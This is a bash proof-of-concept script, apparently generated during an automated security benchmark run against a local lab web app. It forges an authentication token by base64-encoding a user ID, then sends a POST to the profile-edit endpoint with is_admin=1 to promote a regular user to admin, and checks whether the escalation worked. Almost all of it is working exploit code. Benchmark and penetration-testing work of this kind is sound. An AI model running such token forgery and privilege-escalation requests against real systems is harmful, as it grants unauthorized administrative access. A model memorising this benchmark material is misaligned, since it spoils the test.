#!/bin/bash
# POC: Demonstrates vertical privilege escalation where a regular user can promote themselves to admin by modifying the is_admin parameter in the /edit_profile/{user_id} endpoint
# Target: ./repo
# Created: 2025-11-10T14:49:27.422Z
# Session: benchmark-XBEN-021-24-mht8yjkr

# Vertical Privilege Escalation POC - User Self-Promotion to Admin
# This POC demonstrates how a regular user can escalate their privileges to admin
# by modifying the is_admin parameter in their profile edit form.

TARGET_URL="http://localhost:8080"
TEST_USER_ID="3"

echo "=========================================="
echo "Privilege Escalation POC"
echo "=========================================="
echo ""

# Step 1: Create authentication token for user 3
echo "[*] Step 1: Creating authentication token for user $TEST_USER_ID"
TOKEN=$(echo -n "$TEST_USER_ID" | base64)
echo "[+] Token generated: $TOKEN"
echo ""

# Step 2: Verify user is currently NOT admin
echo "[*] Step 2: Verifying user $TEST_USER_ID is NOT admin (before escalation)"
INITIAL_STATUS=$(curl -s -b "user_token=\"Bearer $TOKEN\"" \
    "$TARGET_URL/edit_profile/$TEST_USER_ID" | grep -oP 'value="0"\s+selected')

if [ -n "$INITIAL_STATUS" ]; then
    echo "[+] CONFIRMED: User $TEST_USER_ID is currently a Regular user (is_admin=0)"
else
    echo "[-] Could not confirm user status. Checking full response..."
    curl -s -b "user_token=\"Bearer $TOKEN\"" "$TARGET_URL/edit_profile/$TEST_USER_ID" | grep -E 'is_admin|Regular|Admin'
fi
echo ""

# Step 3: Attempt privilege escalation by setting is_admin=1
echo "[*] Step 3: Attempting privilege escalation by sending is_admin=1"
ESCALATION_RESPONSE=$(curl -s -X POST \
    -b "user_token=\"Bearer $TOKEN\"" \
    "$TARGET_URL/edit_profile/$TEST_USER_ID" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "name=company3&is_admin=1")

echo "[+] Server response received"
echo ""

# Step 4: Verify escalation was successful
echo "[*] Step 4: Verifying privilege escalation (after POST)"
FINAL_STATUS=$(curl -s -b "user_token=\"Bearer $TOKEN\"" \
    "$TARGET_URL/edit_profile/$TEST_USER_ID" | grep -oP 'value="1"\s+selected')

if [ -n "$FINAL_STATUS" ]; then
    echo "[+] SUCCESS: Privilege escalation confirmed!"
    echo "[+] User $TEST_USER_ID is now an ADMIN user (is_admin=1)"
    echo ""
    echo "[!] VULNERABILITY CONFIRMED:"
    echo "    - Non-admin user successfully promoted themselves to admin"
    echo "    - No authorization checks prevented this escalation"
    echo "    - is_admin parameter accepted in POST request without validation"
    exit 0
else
    echo "[-] Escalation may have failed or status not found in response"
    echo "[*] Full response body:"
    echo "$ESCALATION_RESPONSE"
    exit 1
fi